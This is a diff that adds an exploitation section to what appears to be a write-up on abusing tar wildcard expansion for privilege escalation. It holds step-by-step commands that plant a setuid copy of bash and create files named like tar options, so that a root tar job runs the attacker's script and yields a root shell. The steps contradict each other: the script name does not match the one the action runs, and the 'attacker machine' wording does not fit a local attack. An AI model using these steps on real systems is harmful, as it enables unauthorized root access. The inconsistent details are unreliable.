@@ -41,4 +41,33 @@ WE WILL EXPLOIT THIS BEHAVIOUR
 EXPLOITATION
 ------------
 
-1.
+CONCEPTUAL INFORMATION:
+
+–checkpoint[=NUMBER] show progress messages every Numbers record (default 10)
+–checkpoint-action=ACTION execute ACTION on each checkpoint
+
+There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached.
+Mainly, this permits us to run an arbitrary command. Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ 
+are handed to the ‘tar’ program as command-line options.
+
+
+1. create a sh file which will be executed during tar action as checkpoint
+
+echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > /home/user/rajat.sh
+
+2. create a file named /home/user/--checkpoint=1
+
+touch /home/user/--checkpoint=1
+
+3. Create another file named --checkpoint-action in /home/user directory
+
+touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+
+4.Now wait 1 minute for executing bash script
+
+5. from attacker machine's command prompt type
+
+/tmp/bash -p
+
+we will get root shell
+
